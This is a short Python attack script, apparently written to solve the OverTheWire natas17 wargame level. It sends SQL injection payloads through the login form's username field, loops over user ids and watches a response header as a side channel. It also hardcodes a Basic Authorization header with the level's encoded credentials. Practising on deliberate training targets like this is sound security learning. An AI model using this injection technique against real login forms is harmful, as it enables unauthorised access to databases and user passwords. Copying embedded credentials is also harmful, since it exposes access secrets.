#!/usr/bin/env python3

import requests


URL = "http://natas17.natas.labs.overthewire.org/index.php"

session = requests.Session()
session.headers.update({"Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="})


for x in range(120):
  resp = session.post(URL, params={"username":"natas18\" AND id IN (SELECT password FROM users WHERE id={}) #".format(x), "password": "foo", "submit":"Login"}, timeout=10)
  if resp.headers['Connection'] == 'close':
    print(resp.text)
    # print("[+] Found id: ", x)